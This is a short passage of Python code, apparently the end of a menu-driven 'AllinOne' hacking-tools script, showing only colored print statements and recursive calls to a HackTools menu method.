            cprint(colored('Could be an Error nor a Secret all you need to is to look >>>\n', 'red', attrs=['bold']))
            object.HackTools('Elvo.a')
        # -----------------------About Kika----------------------

        else:
            cprint(colored('\n\n\n\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
            return object.HackTools('Elvo.a')


object = AllinOne
object.HackTools('Elvo.a')